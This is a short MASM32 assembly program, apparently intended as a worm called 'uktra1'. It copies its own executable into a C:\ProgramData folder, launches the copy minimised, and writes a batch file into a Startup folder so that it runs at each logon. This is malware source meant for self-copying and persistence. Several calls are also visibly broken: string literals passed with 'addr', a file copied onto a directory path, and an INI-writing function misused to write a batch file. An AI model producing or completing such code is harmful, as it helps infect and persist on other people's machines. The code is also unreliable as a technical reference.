include \masm32\include\windows.inc
include \masm32\include\kernel32.inc
include \masm32\include\user32.inc
includelib \masm32\lib\kernel32.lib
includelib \masm32\lib\user32.lib

.data
    src db 260 dup(0)         ; Path to the current batch file
    dst db "C:\ProgramData\uktra1_Worm", 0
    startup db "C:\Users\Public\Start Menu\Programs\Startup\uktra1_startup.bat", 0
    msg db "@echo off", 0

.code
start:
    invoke GetModuleFileName, NULL, addr src, 260

    ; Create directory and copy file
    invoke CreateDirectory, addr dst, NULL
    invoke CopyFile, addr src, addr dst, FALSE
    invoke ShellExecute, NULL, addr "open", addr dst, addr "uktra1.bat", NULL, SW_MINIMIZE

    ; Write to startup batch file
    invoke WritePrivateProfileString, NULL, NULL, addr msg, addr startup, NULL
    invoke WritePrivateProfileString, NULL, NULL, addr "echo Esecuzione di uktra1", addr startup, NULL

    invoke ExitProcess, 0
end start
